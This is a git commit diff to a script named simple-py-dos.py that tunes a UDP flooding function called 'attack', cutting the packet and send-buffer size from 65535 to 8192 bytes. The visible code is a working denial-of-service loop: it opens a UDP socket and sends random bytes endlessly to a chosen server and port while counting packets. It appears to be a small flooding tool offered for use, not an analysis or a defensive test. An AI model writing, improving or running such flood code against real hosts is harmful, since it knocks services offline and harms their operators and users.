8e9484ed6394900d10f502bb6535182f585cc9e6
Lamaie <l1me47@protonmail.com>
2023-01-05 21:53:51 +0200

    Update simple-py-dos.py

--- simple-py-dos.py
+++ simple-py-dos.py
@@ -6,12 +6,12 @@ import asyncio
 
 async def attack(server, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
     s.settimeout(4)
     packets = 0
     try:
         while True:
-            s.sendto(bytes(random._urandom(65535)), (server, port))
+            s.sendto(bytes(random._urandom(8192)), (server, port))
             packets += 1
             print(f"Sent {packets} packets")
     except:
